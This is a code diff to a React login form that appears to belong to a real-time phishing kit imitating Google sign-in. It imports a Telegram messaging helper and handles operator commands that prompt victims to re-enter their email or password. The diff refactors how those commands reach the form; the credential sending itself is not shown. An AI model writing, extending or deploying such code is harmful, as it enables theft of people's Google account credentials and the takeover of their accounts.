@@ -3,6 +3,7 @@ import GoogleForm from './GoogleForms';
 import { useRouter } from 'next/navigation';
 import { useValidateEmail } from '../app/hooks/useValidate';
 import { sendMessageToTelegram } from '../lib/api';
+import { useCommand } from '../app/lib/CommandContext';
 
 export default function LoginForm() {
     const router = useRouter();
@@ -12,26 +13,26 @@ export default function LoginForm() {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [invalid, setInvalid] = useState(false);
-    const [command, setCommand] = useState(null);
+    const [command, resetCommand] = useCommand();
 
 
 
     // Command handling
     useEffect(() => {
         if (command === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
-            console.log("command in passcheck is ", currentCommand)
+            console.log("command in passcheck is ", command)
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('email');
         } 
         else if (command === 'REQUEST_GOOGLE_PASSWORD') {
-            console.log("command in passcheck is ", currentCommand)
+            console.log("command in passcheck is ", command)
             setIsLoading(false);
             setBgLoader(true);
             setCurrentStep('password');
         }
         else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
-            console.log("command in passcheck is ", currentCommand)
+            console.log("command in passcheck is ", command)
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('password');
